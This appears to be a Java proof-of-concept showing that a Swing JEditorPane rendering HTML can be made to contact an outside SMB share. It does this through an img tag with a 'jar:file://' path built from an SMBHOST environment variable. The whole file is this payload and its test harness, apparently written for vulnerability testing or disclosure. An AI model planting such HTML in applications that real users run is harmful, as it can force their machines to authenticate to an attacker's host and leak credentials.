import javax.swing.*;
public class SwingWindowsProof {
 public static void main(String[] args) throws Exception {
   String host=System.getenv("SMBHOST");
   System.out.println("os="+System.getProperty("os.name")+" smbhost="+host+" java="+System.getProperty("java.version")+" headless="+java.awt.GraphicsEnvironment.isHeadless());
   String html="<html><body><img src='jar:file://"+host+"/SHARE/nonexistent.jar!/x.png'></body></html>";
   SwingUtilities.invokeAndWait(() -> { JEditorPane pane=new JEditorPane("text/html",html); JFrame frame=new JFrame("proof"); frame.add(pane); frame.setSize(500,500); frame.setVisible(true); System.out.println("Rendered frame: "+html); });
   Thread.sleep(25000); System.out.println("done"); System.exit(0);
 }
}
